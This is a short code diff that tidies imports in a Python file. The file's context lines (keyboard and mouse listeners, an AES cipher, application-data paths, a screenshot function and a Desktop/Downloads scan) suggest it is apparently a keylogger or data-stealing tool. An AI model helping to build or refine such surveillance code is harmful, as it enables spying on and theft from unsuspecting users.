@@ -18,6 +18,7 @@ import ctypes
 import keyboard
 from pynput import mouse, keyboard as pynput_keyboard
 from Crypto.Cipher import AES
+from pathlib import Path
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -296,15 +297,6 @@ def take_screenshot(filename='screenshot.png'):
     screenshot = pyautogui.screenshot()
     screenshot.save(filename)
     return filename
-
-
-import os
-from pathlib import Path
-import requests
-import sys
-
-import os
-from pathlib import Path
 
 def list_applications_in_folders():
     # Get the path to the Downloads and Desktop folders
